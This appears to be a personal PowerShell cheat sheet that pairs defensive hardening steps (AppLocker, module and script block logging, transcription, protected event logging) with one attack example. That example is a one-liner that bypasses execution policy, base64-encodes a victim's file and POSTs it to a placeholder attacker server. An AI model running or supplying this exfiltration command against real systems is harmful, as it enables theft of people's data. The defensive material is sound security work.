# Powershell Commands

Personal sheet for Powershell 🧢

## Attacking techniques: practical examples

### HTTP requests

#### Exfiltrate data

```powershell
PowerShell.exe -ex bypass -noprofile -c Invoke-WebRequest -uri {ATTACKER_IP_SERVER} -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\Users\Victim\path\to\data.xml')))
```

## Defense

### Applocker

[Overview](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)

### GPOs (Group policies)

#### Module and Script block logging

Go to Windows Configuration > Policies > Administrative Settings > Windows Components > Windows PowerShell

* Turn on Module Logging
* Turn on PowerShell Script Block Logging

or with Powershell:

```powershell
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"  -Name EnableModuleLogging -Value "1"
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockInvocationLogging -Value "1"
```

Then, it's possible to connect logs to a SIEM or a similar software.

#### Enable transcripting

GPO or:

```powershell
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value "1"
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableInvocationHeader" -Value "1"
```

#### Protected Event Logging

Go to Windows Components -> Administrative Templates -> Event Logging: "Enable Protected Event Logging"
